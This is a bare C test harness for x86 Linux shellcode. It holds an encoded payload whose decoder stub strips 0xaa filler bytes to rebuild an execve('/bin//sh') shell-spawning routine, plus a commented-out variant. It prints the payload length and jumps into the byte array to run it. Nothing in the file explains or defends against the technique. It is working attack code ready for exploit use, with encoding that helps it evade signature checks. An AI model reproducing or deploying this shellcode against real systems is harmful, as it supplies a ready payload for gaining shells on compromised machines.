#include<stdio.h>
#include<string.h>

unsigned char code[] = \
//"\xeb\x2b\x5e\x8d\x7e\x01\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xf3\xbb\x74\x20\x8a\x5c\x06\x01\x88\x1f\x47\x40\x8a\x1c\x06\x80\xf3\xbb\x74\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xdd\xe8\xd0\xff\xff\xff\x31\xc0\xaa\x50\x68\xaa\x2f\x2f\xaa\x73\x68\xaa\x68\x2f\xaa\x62\x69\xaa\x6e\x89\xaa\xe3\x50\xaa\x89\xe2\xaa\x53\x89\xaa\xe1\xb0\xaa\x0b\xcd\xaa\x80\xbb\xbb";
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
